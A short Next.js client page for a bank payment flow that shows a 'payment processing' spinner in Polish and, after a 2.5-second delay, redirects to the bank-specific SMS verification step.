// app/payment/[bank]/processing/page.tsx
"use client";

import { useEffect } from "react";
import { useRouter } from "next/navigation";
import "../../../styles/bank-flow.css";

type Props = {
  params: { bank: string };
};

export default function BankProcessingPage({ params }: Props) {
  const router = useRouter();

  useEffect(() => {
    const timer = setTimeout(() => { 
      router.replace(
        `/payment/${params.bank}/sms`
        
      );
      router.refresh();
    }, 2500);

    return () => clearTimeout(timer);
  }, [params.bank, router]);

  return (
    <div className="bank-processing-page">
      <div className="bank-processing-card">
        <div className="bank-spinner" />
        <p>Trwa przetwarzanie płatności…</p>
      </div>
    </div>
  );
}
